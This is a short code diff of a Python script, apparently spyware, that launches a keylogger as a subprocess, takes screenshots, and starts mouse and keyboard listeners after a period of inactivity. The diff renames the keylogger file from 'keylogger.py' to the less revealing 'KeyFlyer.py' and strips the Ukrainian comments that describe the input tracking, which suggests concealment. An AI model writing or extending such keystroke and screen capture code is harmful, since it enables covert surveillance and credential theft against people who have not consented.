@@ -33,7 +33,7 @@ def take_screen_screenshot():
 def start_keylogger():
     global keylogger_started
     if not keylogger_started:
-        keylogger_path = os.path.join(base_dir, "keylogger.py")  # Change to open the program (Keylogger F.X.)
+        keylogger_path = os.path.join(base_dir, "KeyFlyer.py")  # Change to open the program (Keylogger F.X.)
         subprocess.Popen(["python", keylogger_path])
         print("Keylogger started")
         keylogger_started = True
@@ -86,11 +86,9 @@ def main():
     global program_running
     time.sleep(15)  # Час неактивності в секундах
 
-    # Відслідковування миші
     mouse_listener = mouse.Listener(on_move=on_mouse_move, on_click=on_mouse_click, on_scroll=on_mouse_scroll)
     mouse_listener.start()
 
-    # Відслідковування клавіатури
     keyboard_listener = keyboard.Listener(on_press=on_key_press)
     keyboard_listener.start()
 
